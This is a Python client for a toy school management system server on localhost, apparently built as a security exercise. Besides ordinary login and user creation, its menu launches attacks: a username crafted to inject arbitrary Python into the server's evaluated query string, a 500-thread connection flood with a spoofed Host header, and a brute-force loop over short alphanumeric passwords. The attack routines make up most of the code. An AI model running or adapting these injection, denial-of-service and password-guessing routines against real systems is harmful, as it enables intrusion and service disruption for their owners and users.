from encryption import *
from SMS import SMS
from time import sleep
import socket
import threading
import string

class ClientConnection:
    def __init__(self):
        self.client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.client_socket.connect(("127.0.0.1", 12345))

    def query_server(self, string_to_run):
        print("Sending query: ", string_to_run)
        self.client_socket.send(string_to_run.encode())
        response = self.client_socket.recv(1024).decode()
        print("Response recieved: ", response)

        if response.lower() in ['true', 'false']:
            response = bool(response.lower() == 'true')
        return response
#API injection is created    
def login_menu(cc):
    while cc.query_server("sms.current_user") == "null":
        user_input = input("Please select one of the following: \n1-Log in \n2-Create new user \n3-Create new user and inject \n4-DDOS Attack \n5-Bruteforce \n")
        if user_input == '1':
            log_in(cc)
        elif user_input == '2':
            create_user(cc)
        elif user_input == '3':
            create_user_and_inject(cc)
        elif user_input == '4':
            launch_ddos()
        elif user_input == '5':
            bruteforce_password(cc)
        else:
            print("Invalid Input")

def log_in(cc):
    username = str(input("Please enter a username: "))
    if cc.query_server(f"sms.verify_username('{username}')"):
        password = input("Please enter a password: ")
        if cc.query_server(f"sms.log_in('{username}', '{password}')"):
            return True
        else:
            print("Please enter a valid Password")
            return False
    else:
        print("Please enter a valid username: ")
        return False
    
def create_user(cc):
    username = input("Please enter a user name for your new user:")
    if  cc.query_server(f"sms.verify_username('{username}')"):
        print("That username is already taken.")
        return False
    else:
        password = input("Enter a password: ")
        cc.query_server(f"sms.add_user('{username}', '{password}')")
        return True

def create_user_and_inject(cc):
    injection_code = "print('HELLO WORLD YOU HAVE BEEN INJECTED')"
    username = f"test',{injection_code},'"
    print(f"we are injecting {username} to try and run arbitrary code on the server")
    print(f"There server will be sent 'sms.verify_username(\'{username}\')'")    
    if  cc.query_server(f"sms.verify_username('{username}')"):
        print("That username is already taken.")
        return False
    else:
        password = input("Enter a password: ")
        cc.query_server(f"sms.add_user('{username}', '{password}')")
        return True
# a DDOS is created    
def launch_ddos():
    for i in range(500):
        thread = threading.Thread(target=attack)
        thread.start()

def attack():
    fake_ip = '182.21.20.32'

    while True:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect(('127.0.0.1', 12345))
        s.sendto(("GET /" + '127.0.0.1' + " HTTP/1.1\r\n").encode('ascii'), ('127.0.0.1', 12345))
        s.sendto(("Host: " + fake_ip + "\r\n\r\n").encode('ascii'), ('127.0.0.1', 12345))
        s.close()

def generate_passwords(length):
    chars = string.ascii_letters + string.digits
    passwords = [""]
    for i in range(length):
        new_passwords = []
        for combination in passwords:
            for char in chars:
                new_passwords.append(combination + char)
        passwords = new_passwords

    return passwords
#brute force attack code is created
def bruteforce_password(cc):
    username = input("What user would you like to bruteforce? ")
    passwords = []
    for length in range(1, 4):
        passwords.extend(generate_passwords(length))
    for c in passwords:
        if cc.query_server(f"sms.log_in('{username}', '{c}')"):
            return True
    return False

# main menu is defined
def main_menu():

    cc = ClientConnection()


    login_menu(cc)


    while True:
        sleep(1)
        print("\nSchool management system main menu:")
        print("\n1- View users and their roles")

        choice = input("\nEnter what you want to do (1-6):")
        if choice == '1':
            response = cc.query_server("sms.display_roles()")
            print(response)
        else:
            print("\nThat was an invalid choice. Please try again.")

if __name__ == "__main__":
    main_menu()